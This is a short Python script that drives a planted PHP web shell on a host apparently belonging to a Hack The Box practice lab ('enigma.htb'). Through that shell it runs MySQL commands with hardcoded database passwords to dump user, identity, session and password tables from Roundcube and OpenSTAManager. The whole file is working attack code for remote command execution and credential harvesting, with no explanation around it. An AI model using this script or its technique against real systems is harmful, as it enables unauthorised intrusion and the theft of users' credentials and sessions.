import urllib.request, urllib.parse

cmds = [
    # Check Roundcube DB for user passwords
    'mysql -u roundcube -pYo270x26\\!gTx02 roundcubemail -e "SELECT * FROM users;" 2>&1',
    'mysql -u roundcube -pYo270x26\\!gTx02 roundcubemail -e "SELECT * FROM identities;" 2>&1',
    'mysql -u roundcube -pYo270x26\\!gTx02 roundcubemail -e "SELECT * FROM session;" 2>&1',
    'mysql -u roundcube -pYo270x26\\!gTx02 roundcubemail -e "SHOW TABLES;" 2>&1',
    # Check OpenSTAManager for any password hints
    'mysql -u brollin -pFri3nds@9099 stm -e "SELECT nome,cognome,username,password FROM utenti;" 2>&1',
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:1000])
            print()
    except Exception as e:
        pass
